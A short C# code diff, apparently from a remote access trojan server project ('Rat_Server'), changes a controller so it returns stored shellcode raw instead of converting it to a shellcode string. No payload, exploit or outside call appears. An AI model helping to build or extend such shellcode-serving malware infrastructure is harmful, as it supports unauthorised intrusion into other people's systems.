@@ -33,7 +33,7 @@ namespace Rat_Server.Controllers
             return Ok(new ShellCodeDto
             {
                 Name = shellCode.Name,
-                Code = ShellCodeConverter.ToShellCodeString(shellCode.Code)
+                Code = shellCode.Code
             });
         }
     }
